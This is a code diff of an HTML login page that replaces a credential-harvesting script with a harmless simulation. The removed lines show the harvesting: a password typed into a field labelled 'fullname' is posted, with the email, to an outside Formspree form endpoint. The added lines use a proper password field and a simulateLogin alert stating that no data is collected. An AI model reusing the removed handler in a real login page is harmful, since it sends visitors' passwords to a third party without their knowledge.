@@ -97,37 +97,16 @@
             <label for="fullname">Password</label>
             <div class="sec-2">
                 <ion-icon name="person-outline"></ion-icon>
-                <input type="text" id="fullname" name="fullname" placeholder="Enter Your Password">
+                <input type="password" id="password" name="password" placeholder="Enter Your Password">
             </div>
         </div>
 
-        <button class="send" onclick="sendFormData()">Login</button>
+        <button class="send" onclick="simulateLogin()">Login</button>
 
         <script>
-            function sendFormData() {
-                const email = document.getElementById('email').value;
-                const fullname = document.getElementById('fullname').value;
-
-                if (email && fullname) {
-                    const formData = new FormData();
-                    formData.append('email', email);
-                    formData.append('fullname', fullname);
-
-                    fetch('https://formspree.io/f/xeqyqaay', {
-                        method: 'POST',
-                        body: formData,
-                        headers: {
-                            'Accept': 'application/json'
-                        }
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        console.log(data);
-                    })
-                    .catch(error => {
-                        console.error(error);
-                    });
-                }
+            function simulateLogin() {
+                alert("This is a simulation. No real data is collected or sent.");
+                // You can add further actions here, such as redirecting to another page
             }
         </script>
     </div>
